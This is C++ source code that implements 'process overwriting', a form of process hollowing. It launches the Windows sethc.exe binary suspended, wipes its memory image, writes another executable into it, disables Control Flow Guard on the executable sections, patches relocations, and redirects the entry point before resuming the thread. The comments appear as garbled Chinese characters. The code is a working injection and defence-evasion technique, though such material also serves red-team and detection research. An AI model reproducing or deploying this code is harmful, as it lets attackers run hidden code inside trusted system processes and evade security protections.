#include <iostream>
#include "cfg.h"
using namespace std;

typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

// Ҫȷ��SourceFile��TargetFile��Subsystem��ͬ������ע��ʧ��
const LPCSTR SourceFile = "C:\\Users\\cys\\Desktop\\box64.exe";  // ��ע��PE
const LPCSTR TargetFile = "C:\\windows\\System32\\sethc.exe";  // Ŀ��PE  SysWOW64

//---------------------------------------------------------------------------------------------


int main()
{
	cout << "[+]Process Overwriting" << endl;
	//�����������
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFOA);
	PROCESS_INFORMATION pi;

	CreateProcessA(
		TargetFile,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (!pi.hProcess) { cerr << "[-]Creat process fail"; return 1; }
	cout << "[+]Process PID: " << pi.dwProcessId << endl;

	HANDLE hfile = CreateFile(SourceFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dwFileSize = GetFileSize(hfile, NULL);
	PVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD dwReadSize = 0;
	ReadFile(hfile, lpBuffer, dwFileSize, &dwReadSize, NULL);
	CloseHandle(hfile);

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);
	PVOID RemoteImageBase;
	BOOL readpeb = NULL;

	// ��ȡ��������̻�ַ���ɣ�ͨ���Ĵ���https://bbs.kanxue.com/thread-253432-1.htm
#ifdef _WIN64
	// ��rdx�Ĵ����л�ȡPEB��ַ������PEB�ж�ȡ����Ŀ�ִ��ӳ��Ļ�ַ
	readpeb = ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _X86_
	// ��ebx�Ĵ����л�ȡPEB��ַ������PEB�ж�ȡ����Ŀ�ִ��ӳ��Ļ�ַ
	readpeb = ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
	if (!readpeb) {
		DWORD error = GetLastError();
		cout << "[-]ReadProcessMemory failed with error code: " << error << endl;
		return 1;
	}

	// �ж�targetsize �� sourcesize ��С
	const auto SourceDos = (PIMAGE_DOS_HEADER)lpBuffer;
	const auto SourceNt = (PIMAGE_NT_HEADERS)((LPBYTE)lpBuffer + SourceDos->e_lfanew);
	
	const auto TargetDos = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
	const auto TargetNt = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
	
	ReadProcessMemory(pi.hProcess, RemoteImageBase, TargetDos, sizeof(IMAGE_DOS_HEADER), NULL);
	uintptr_t  ntHeadersAddr = (uintptr_t)RemoteImageBase + TargetDos->e_lfanew;
	ReadProcessMemory(pi.hProcess, (LPCVOID)ntHeadersAddr, TargetNt, sizeof(IMAGE_NT_HEADERS), NULL);
	BOOL is_CFG = TRUE;
	
	if (TargetNt->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_GUARD_CF) {
		cout << "[+]Target CFG is enable" << endl;
	}
	else {
		cout << "[+]Target CFG is disenable" << endl;
		is_CFG = FALSE;
	}

	const auto TargetSize = TargetNt->OptionalHeader.SizeOfImage;
	cout << "[+]Target Size is: " << TargetSize << endl;
	cout << "[+]Source Size is: " << dwFileSize << endl;

	if (TargetSize < dwFileSize) {
		cout << "[-]Target is too small" << endl;
		return 1;
	}

	// ��дsource��target
	PVOID TmpBuffer = VirtualAlloc(NULL, TargetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD oldProtection;
	VirtualProtectEx(pi.hProcess, RemoteImageBase, TargetSize, PAGE_EXECUTE_READWRITE, &oldProtection);
	// ����Ϊ��
	WriteProcessMemory(pi.hProcess, RemoteImageBase, TmpBuffer, TargetSize, NULL);
	VirtualFree(TmpBuffer, 0, MEM_RELEASE);

	const DWORD64 DeltaImageBase = (DWORD64)RemoteImageBase - SourceNt->OptionalHeader.ImageBase;
	SourceNt->OptionalHeader.ImageBase = (DWORD64)RemoteImageBase;

	//д���ļ�ͷ������ DOS/NT/SECTION headers
	//�� pi.hProcess �е� pRemoteMem ��ַ��ʼд lpBuffer ���ݵ� SourceNt->OptionalHeader.SizeOfHeaders ��С�ֽ�
	WriteProcessMemory(pi.hProcess, RemoteImageBase, lpBuffer, SourceNt->OptionalHeader.SizeOfHeaders, NULL);
	
	const IMAGE_DATA_DIRECTORY ImageDataReloc = SourceNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	//д��section����
	for (int i = 0; i < SourceNt->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)SourceNt + 4 + sizeof(IMAGE_FILE_HEADER) + SourceNt->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		// ��λreloc
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		PVOID pSectionDestination = (PVOID)((LPBYTE)RemoteImageBase + lpImageSectionHeader->VirtualAddress);
		WriteProcessMemory(pi.hProcess, pSectionDestination, (LPVOID)((uintptr_t)lpBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		cout << "[*]Writing " << lpImageSectionHeader->Name << " section to 0x" << hex << pSectionDestination << endl;

		// ����CFG
		if (lpImageSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			cout << "[+]Disabling CFG for section " << lpImageSectionHeader->Name << endl;
			DisableCfg(pi, TargetSize, RemoteImageBase, lpImageSectionHeader->SizeOfRawData, pSectionDestination);
		}
	}

	cout << "[+]Relocation section :" << lpImageRelocSection->Name << endl;

	//�޸��ض�λ
	DWORD RelocOffset = 0;
	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;
			const DWORD64 AddressLocation = (DWORD64)RemoteImageBase + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;
			ReadProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
			PatchedAddress += DeltaImageBase;
			WriteProcessMemory(pi.hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
		}
	}

	cout << "[+]Relocations done" << endl;

//https://stackoverflow.com/questions/57341183/view-address-of-entry-point-in-eax-register-for-a-suspended-process-in-windbg
#ifdef _WIN64
	//��rcx�Ĵ�������Ϊע���������ڵ�
	ctx.Rcx = (SIZE_T)((LPBYTE)RemoteImageBase + SourceNt->OptionalHeader.AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
#ifdef _X86_
	//��eax�Ĵ�������Ϊע���������ڵ�
	ctx.Eax = (SIZE_T)((LPBYTE)RemoteImageBase + SourceNt->OptionalHeader.AddressOfEntryPoint);
	WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
#endif
	//�ͷű��ڴ���PE�ۼ�
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
	cout << "[+]SetThreadContext" << endl;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}